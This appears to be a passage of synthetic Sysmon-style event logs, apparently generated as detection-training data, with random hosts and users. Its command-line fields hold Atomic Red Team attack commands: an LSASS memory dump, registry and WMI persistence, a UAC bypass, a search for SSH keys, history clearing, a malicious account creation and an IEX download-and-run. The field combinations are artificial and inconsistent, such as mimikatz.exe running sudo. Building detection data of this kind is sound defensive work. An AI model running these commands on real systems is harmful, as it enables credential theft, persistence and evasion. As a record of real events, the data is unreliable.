        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"net stop w32time\\nCopy-Item \\\"$PathToAtomicsFolder\\\\T1547.003\\\\bin\\\\AtomicTest.dll\\\" C:\\\\Users\\\\Public\\\\AtomicTest.dll\\nreg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\W32Time\\\\TimeProviders\\\\NtpServer\\\" /t REG_SZ /v \\\"DllName\\\" /d \\\"C:\\\\Users\\\\Public\\\\AtomicTest.dll\\\" /f\\nreg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\W32Time\\\\TimeProviders\\\\NtpServer\\\" /t REG_DWORD /v \\\"Enabled\\\" /d \\\"1\\\" /f\\nreg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\W32Time\\\\TimeProviders\\\\NtpServer\\\" /t REG_DWORD /v \\\"InputProvider\\\" /d \\\"1\\\" /f\\nnet start w32time\\n\",",
        "LogonID": 448347,
        "LogonGuid": "bb3e269e-b62c-4650-86bb-fd2690f7c331",
        "SourceProcessID": 6270,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\son..dll",
        "DestinationProcessID": 3149,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\half..dll",
        "UtcTime": "2024-05-17T01:36:51.638040Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-81.reyes.com",
        "User": "hpena",
        "ProcessID": 1573,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"\\\"#{procdump_exe}\\\" -accepteula -mm lsass.exe #{output_file}\\n\",",
        "LogonID": 267766,
        "LogonGuid": "c7779ab3-7725-44b6-83b9-ed47612badb0",
        "SourceProcessID": 8565,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\finish..exe",
        "DestinationProcessID": 7155,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\believe..dll",
        "UtcTime": "2024-05-17T01:36:51.638040Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-28.dunn.com",
        "User": "mackjoseph",
        "ProcessID": 8664,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"sudo touch /Library/StartupItems/EvilStartup.plist\\n\",",
        "LogonID": 535125,
        "LogonGuid": "b1136b3e-83f9-4e04-9524-d67840d1d231",
        "SourceProcessID": 3390,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\least..exe",
        "DestinationProcessID": 8638,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\situation..dll",
        "UtcTime": "2024-05-17T01:36:51.639038Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-54.malone.org",
        "User": "mvalenzuela",
        "ProcessID": 4459,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"sudo #{program_path} -4 -P -p 17 -t 3\\n\",",
        "LogonID": 470103,
        "LogonGuid": "41e8b952-7313-4f1a-8f6f-814343186fb1",
        "SourceProcessID": 6031,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\debate..exe",
        "DestinationProcessID": 4665,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\five..exe",
        "UtcTime": "2024-05-17T01:36:51.639038Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-71.marks.com",
        "User": "lawrencerobert",
        "ProcessID": 4361,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"REG ADD \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Minimal\\\\AtomicSafeMode\\\" /VE /T REG_SZ /F /D \\\"Service\\\"\\n\",",
        "LogonID": 335799,
        "LogonGuid": "964e4e02-55bb-4fcd-8028-a8822be4d55f",
        "SourceProcessID": 9051,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\possible..exe",
        "DestinationProcessID": 8152,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\population..exe",
        "UtcTime": "2024-05-17T01:36:51.639038Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-77.henderson.com",
        "User": "stephanie16",
        "ProcessID": 4410,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"$notepad = Start-Process notepad -passthru\\nStart-Process \\\"$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\InjectView.exe\\\"\\n\",",
        "LogonID": 706812,
        "LogonGuid": "cd026995-9411-4fb8-8262-2ffcfc83e465",
        "SourceProcessID": 1803,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\game..dll",
        "DestinationProcessID": 3523,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\TV..dll",
        "UtcTime": "2024-05-17T01:36:51.639038Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-54.stanley.com",
        "User": "michael46",
        "ProcessID": 8967,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"cmd /c \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\nimgrab.exe\\\" #{remote_file} #{destination_path}\\n\",",
        "LogonID": 328831,
        "LogonGuid": "076ac860-84e8-48a4-9836-575d1ff6fb15",
        "SourceProcessID": 1913,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\start..exe",
        "DestinationProcessID": 2394,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\speech..dll",
        "UtcTime": "2024-05-17T01:36:51.639038Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-09.harper.com",
        "User": "newmankristi",
        "ProcessID": 5190,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"Start-Process -FilePath \\\"$Env:ProgramFiles\\\\Process Hacker 2\\\\#{processhacker_exe}\\\"\",",
        "LogonID": 173278,
        "LogonGuid": "7764520d-dcc7-4968-84d8-12596aeee30d",
        "SourceProcessID": 3143,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\scientist..exe",
        "DestinationProcessID": 8937,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\for..exe",
        "UtcTime": "2024-05-17T01:36:51.640039Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-39.long-ramirez.biz",
        "User": "amandasilva",
        "ProcessID": 1130,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"history -c\\n\",",
        "LogonID": 598863,
        "LogonGuid": "1003efe7-cfda-41df-9961-13a3528f8eca",
        "SourceProcessID": 3015,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\help..dll",
        "DestinationProcessID": 2447,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\give..dll",
        "UtcTime": "2024-05-17T01:36:51.640039Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-70.walker.com",
        "User": "anthonymoore",
        "ProcessID": 4784,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck\\ncopy '#{local_file}' 'Z:\\\\'\\n\",",
        "LogonID": 226400,
        "LogonGuid": "96317942-3613-4f27-bf92-d1e463253ac0",
        "SourceProcessID": 1935,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\television..dll",
        "DestinationProcessID": 6325,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\feeling..dll",
        "UtcTime": "2024-05-17T01:36:51.640039Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-52.lang-lopez.com",
        "User": "patriciarios",
        "ProcessID": 7998,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}\",",
        "LogonID": 657499,
        "LogonGuid": "a89098e0-727c-4700-88d5-8963991cde18",
        "SourceProcessID": 3521,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\want..exe",
        "DestinationProcessID": 7051,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\range..dll",
        "UtcTime": "2024-05-17T01:36:51.640039Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-88.waters.net",
        "User": "jeffrey34",
        "ProcessID": 2727,
        "ProcessName": "malware.exe",
        "CommandLine": "\"reg query \\\"HKEY_CURRENT_USER\\\\Control Panel\\\\International\\\\Geo\\\"\\n\",",
        "LogonID": 195023,
        "LogonGuid": "b2f3b4f3-27e1-4785-b6bf-f8b7e1fae2d7",
        "SourceProcessID": 3905,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\our..exe",
        "DestinationProcessID": 3588,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\training..dll",
        "UtcTime": "2024-05-17T01:36:51.641040Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-30.haynes.com",
        "User": "william74",
        "ProcessID": 9244,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"#{curl_path} -s -A \\\"HttpBrowser/1.0\\\" -m3 #{domain} >nul 2>&1\\n#{curl_path} -s -A \\\"Wget/1.9+cvs-stable (Red Hat modified)\\\" -m3 #{domain} >nul 2>&1\\n#{curl_path} -s -A \\\"Opera/8.81 (Windows NT 6.0; U; en)\\\" -m3 #{domain} >nul 2>&1\\n#{curl_path} -s -A \\\"*<|>*\\\" -m3 #{domain} >nul 2>&1\\n\",",
        "LogonID": 869143,
        "LogonGuid": "d071e2c5-1314-4c99-a5a7-72cca7d05ab6",
        "SourceProcessID": 1747,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\watch..dll",
        "DestinationProcessID": 2161,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\statement..dll",
        "UtcTime": "2024-05-17T01:36:51.641040Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-06.guzman.com",
        "User": "bernardlauren",
        "ProcessID": 9781,
        "ProcessName": "malware.exe",
        "CommandLine": "\"pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account\\n\",",
        "LogonID": 926085,
        "LogonGuid": "e8f50503-ae6f-4dd9-98ca-5babb1bca22a",
        "SourceProcessID": 6352,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\herself..dll",
        "DestinationProcessID": 8243,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\across..exe",
        "UtcTime": "2024-05-17T01:36:51.641040Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-11.chung.com",
        "User": "uproctor",
        "ProcessID": 5785,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'\\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nInvoke-WebRequest -Uri $url -OutFile $env:TEMP\\\\PhishingAttachment.xlsm\\n\",",
        "LogonID": 899845,
        "LogonGuid": "4293932f-0d95-4351-8576-a6c6740fe455",
        "SourceProcessID": 5808,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\effort..exe",
        "DestinationProcessID": 2080,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\it..dll",
        "UtcTime": "2024-05-17T01:36:51.641040Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-19.wagner.com",
        "User": "elucas",
        "ProcessID": 4972,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}\\nexit 0\\n\",",
        "LogonID": 627131,
        "LogonGuid": "be56f229-2a88-49c1-af8f-11d8a6aa020b",
        "SourceProcessID": 2096,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\war..dll",
        "DestinationProcessID": 2586,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\building..dll",
        "UtcTime": "2024-05-17T01:36:51.641040Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-87.hernandez.com",
        "User": "montoyasarah",
        "ProcessID": 1268,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing) \\nInvoke-Maldoc -macroFile \\\"PathToAtomicsFolder\\\\T1059.005\\\\src\\\\T1059_005-macrocode.txt\\\" -officeProduct \\\"Word\\\" -sub \\\"Extract\\\"\\n\",",
        "LogonID": 449526,
        "LogonGuid": "d38ce040-928f-49aa-8c46-ad391fae620c",
        "SourceProcessID": 3871,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\exactly..exe",
        "DestinationProcessID": 5698,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\serious..exe",
        "UtcTime": "2024-05-17T01:36:51.642038Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-19.dunn.com",
        "User": "khodges",
        "ProcessID": 6299,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"osascript #{scriptfile}\\n\",",
        "LogonID": 740100,
        "LogonGuid": "57ba662f-4982-4eb0-a2bf-1e50ff21d129",
        "SourceProcessID": 6396,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\those..exe",
        "DestinationProcessID": 8277,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\same..dll",
        "UtcTime": "2024-05-17T01:36:51.642038Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-87.brown-williams.info",
        "User": "hodgesrebecca",
        "ProcessID": 5262,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg add \\\"hklm\\\\system\\\\currentcontrolset\\\\control\\\\lsa\\\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\\n\",",
        "LogonID": 976622,
        "LogonGuid": "bb82c6a0-8de5-4dee-8ad1-946a3a6ab592",
        "SourceProcessID": 5682,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\force..exe",
        "DestinationProcessID": 5107,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\pass..dll",
        "UtcTime": "2024-05-17T01:36:51.642038Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-76.ferguson.biz",
        "User": "nathanramos",
        "ProcessID": 6129,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"#{msi_exe} /q /#{action} \\\"#{msi_payload}\\\"\\n\",",
        "LogonID": 235547,
        "LogonGuid": "ce000999-9e10-4c26-91e4-9a7eab42a463",
        "SourceProcessID": 5493,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\now..exe",
        "DestinationProcessID": 3712,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\generation..dll",
        "UtcTime": "2024-05-17T01:36:51.642038Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-74.hill.biz",
        "User": "wileyelizabeth",
        "ProcessID": 3398,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\\n                EventNameSpace='root\\\\CimV2';\\n                QueryLanguage=\\\"WQL\\\";\\n                Query=\\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\\\"};\\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\\n\\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\\n                CommandLineTemplate=\\\"$($Env:SystemRoot)\\\\System32\\\\notepad.exe\\\";}\\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\\n\\n$FilterToConsumerArgs = @{\\nFilter = [Ref] $Filter;\\nConsumer = [Ref] $Consumer;\\n}\\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\\n\",",
        "LogonID": 952928,
        "LogonGuid": "7a7a2432-b848-4ea1-b29d-78aec205563c",
        "SourceProcessID": 2267,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\name..exe",
        "DestinationProcessID": 1731,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\off..dll",
        "UtcTime": "2024-05-17T01:36:51.642038Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-27.ferrell-berg.com",
        "User": "pbarber",
        "ProcessID": 3597,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"New-Item \\\"HKCU:\\\\software\\\\classes\\\\mscfile\\\\shell\\\\open\\\\command\\\" -Force\\nSet-ItemProperty \\\"HKCU:\\\\software\\\\classes\\\\mscfile\\\\shell\\\\open\\\\command\\\" -Name \\\"(default)\\\" -Value \\\"#{executable_binary}\\\" -Force\\nStart-Process \\\"C:\\\\Windows\\\\System32\\\\eventvwr.msc\\\"\\n\",",
        "LogonID": 857887,
        "LogonGuid": "2c6f9e1a-a0e6-4458-b2ab-c44905d1a8c9",
        "SourceProcessID": 4373,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\child..dll",
        "DestinationProcessID": 6303,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\be..dll",
        "UtcTime": "2024-05-17T01:36:51.642038Z"
    },
